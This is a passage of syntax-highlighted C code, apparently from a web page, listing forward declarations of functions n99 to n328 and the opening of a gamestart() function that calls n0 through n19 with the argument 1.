class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n99</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n100</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n101</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n102</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n103</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n104</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n105</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n106</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n107</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n108</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n109</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n110</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n111</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n112</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n113</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n114</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n115</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n116</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n117</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n118</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n119</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n120</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n121</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n122</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n123</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n124</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n125</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n126</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n127</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n128</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n129</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n130</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n131</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n132</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n133</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n134</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n135</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n136</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n137</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n138</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n139</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n140</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n141</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n142</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n143</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n144</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n145</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n146</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n147</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n148</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n149</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n150</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n151</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n152</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n153</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n154</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n155</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n156</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n157</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n158</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n159</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n160</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n161</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n162</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n163</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n164</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n165</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n166</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n167</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n168</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n169</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n170</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n171</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n172</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n173</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n174</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n175</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n176</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n177</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n178</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n179</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n180</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n181</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n182</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n183</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n184</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n185</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n186</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n187</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n188</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n189</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n190</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n191</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n192</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n193</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n194</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n195</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n196</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n197</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n198</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n199</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n200</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n201</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n202</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n203</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n204</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n205</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n206</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n207</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n208</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n209</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n210</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n211</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n212</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n213</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n214</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n215</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n216</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n217</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n218</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n219</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n220</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n221</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n222</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n223</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n224</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n225</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n226</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n227</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n228</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n229</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n230</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n231</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n232</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n233</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n234</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n235</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n236</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n237</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n238</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n239</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n240</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n241</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n242</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n243</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n244</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n245</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n246</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n247</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n248</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n249</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n250</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n251</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n252</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n253</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n254</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n255</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n256</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n257</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n258</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n259</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n260</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n261</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n262</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n263</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n264</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n265</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n266</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n267</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n268</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n269</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n270</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n271</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n272</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n273</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n274</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n275</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n276</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n277</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n278</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n279</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n280</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n281</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n282</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n283</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n284</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n285</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n286</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n287</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n288</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n289</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n290</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n291</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n292</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n293</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n294</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n295</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n296</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n297</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n298</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n299</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n300</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n301</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n302</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n303</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n304</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n305</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n306</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n307</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n308</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n309</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n310</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n311</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n312</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n313</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n314</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n315</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n316</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n317</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n318</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n319</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n320</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n321</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n322</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n323</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n324</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n325</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n326</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n327</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n328</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gamestart</span><span class="hljs-params">()</span><br>&#123;<br><br>n0(<span class="hljs-number">1</span>);<br>n1(<span class="hljs-number">1</span>);<br>n2(<span class="hljs-number">1</span>);<br>n3(<span class="hljs-number">1</span>);<br>n4(<span class="hljs-number">1</span>);<br>n5(<span class="hljs-number">1</span>);<br>n6(<span class="hljs-number">1</span>);<br>n7(<span class="hljs-number">1</span>);<br>n8(<span class="hljs-number">1</span>);<br>n9(<span class="hljs-number">1</span>);<br>n10(<span class="hljs-number">1</span>);<br>n11(<span class="hljs-number">1</span>);<br>n12(<span class="hljs-number">1</span>);<br>n13(<span class="hljs-number">1</span>);<br>n14(<span class="hljs-number">1</span>);<br>n15(<span class="hljs-number">1</span>);<br>n16(<span class="hljs-number">1</span>);<br>n17(<span class="hljs-number">1</span>);<br>n18(<span class="hljs-number">1</span>);<br>n19(<span 